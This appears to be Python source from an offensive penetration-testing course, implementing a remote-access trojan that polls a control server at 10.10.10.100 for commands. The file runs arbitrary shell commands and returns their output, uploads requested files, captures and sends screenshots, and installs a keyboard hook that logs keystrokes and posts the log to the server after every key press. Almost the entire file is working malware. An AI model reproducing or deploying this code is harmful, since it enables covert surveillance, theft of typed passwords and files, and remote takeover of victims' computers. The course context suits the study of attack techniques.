# Python For Offensive PenTest: A Complete Practical Course - All rights reserved
# Follow me on LinkedIn  https://jo.linkedin.com/in/python2


#moze warto sprawdzic https://github.com/ajinabraham/Xenotix-Python-Keylogger/blob/master/xenotix_python_logger.py

'''
Installing Pillow
C:\Users\hkhrais>pip install Pillow
'''

import requests
import subprocess
import os
import time
import pythoncom, pyHook

from PIL import ImageGrab  # Used to Grab a screenshot
import tempfile  # Used to Create a temp directory
import shutil  # Used to Remove the temp directory

dirpath2 = tempfile.mkdtemp()
	
def keypressed(event):
    global store

    # Enter and backspace are not handled properly that's why we hardcode thier values to < Enter > and <BACK SPACE>
    # note that we can know if the user input was enter or backspace based on thier ASCII values

    if event.Ascii == 13:
        keys = ' < Enter > '
    elif event.Ascii == 8:
        keys = ' <BACK SPACE> '

    else:
        keys = chr(event.Ascii)

    store = store + keys  # at the end we append the ascii keys into store variable and finally write them in keylogs text file

    # fp=open("keylogs.txt","w")
    #dirpath2 = tempfile.mkdtemp()
    fp = open(dirpath2 + "\keylogs.txt", "w")
    fp.write(store)
    fp.close()
   
   # send file every time when type sth:   
    url = 'http://10.10.10.100/store'
    files = {'file': open(dirpath2 + "\keylogs.txt", 'rb')}
    r = requests.post(url, files=files)  # Transfer the file over our HTTP

    files['file'].close()  # Once the file gets transfered, close the file.


while True:

    req = requests.get('http://10.10.10.100')
    command = req.text

    if 'terminate' in command:
        break

    elif 'grab' in command:
        grab, path = command.split('*')
        if os.path.exists(path):
            url = 'http://10.10.10.100/store'
            files = {'file': open(path, 'rb')}
            r = requests.post(url, files=files)
        else:
            post_response = requests.post(url='http://10.10.10.100', data='[-] Not able to find the file !')


    elif 'screencap' in command:  # If we got a screencap keyword, then ..

        dirpath = tempfile.mkdtemp()  # Create a temp dir to store our screenshot file

        ImageGrab.grab().save(dirpath + "\img.jpg", "JPEG")  # Save the screencap in the temp dir

        url = 'http://10.10.10.100/store'
        files = {'file': open(dirpath + "\img.jpg", 'rb')}
        r = requests.post(url, files=files)  # Transfer the file over our HTTP

        files['file'].close()  # Once the file gets transfered, close the file.
        shutil.rmtree(dirpath)  # Remove the entire temp dir

    elif 'keylogger' in command:
           store = ''  # string where we will store all the pressed keys
           obj = pyHook.HookManager()
           obj.KeyDown = keypressed
           obj.HookKeyboard()  # start the hooking loop and pump out the messages
           pythoncom.PumpMessages()
           time.sleep(60)
           obj = pyHook.HookManager()
           obj.UnhookKeyboard()
        # elif 'keysend' in command:
           # url = 'http://10.10.10.100/store'
           # files = {'file': open(dirpath2 + "\keylogs.txt", 'rb')}
           # r = requests.post(url, files=files)  # Transfer the file over our HTTP

           # files['file'].close()  # Once the file gets transfered, close the file.

    else:
        CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                               stdin=subprocess.PIPE)
        post_response = requests.post(url='http://10.10.10.100', data=CMD.stdout.read())
        post_response = requests.post(url='http://10.10.10.100', data=CMD.stderr.read())

    time.sleep(3)





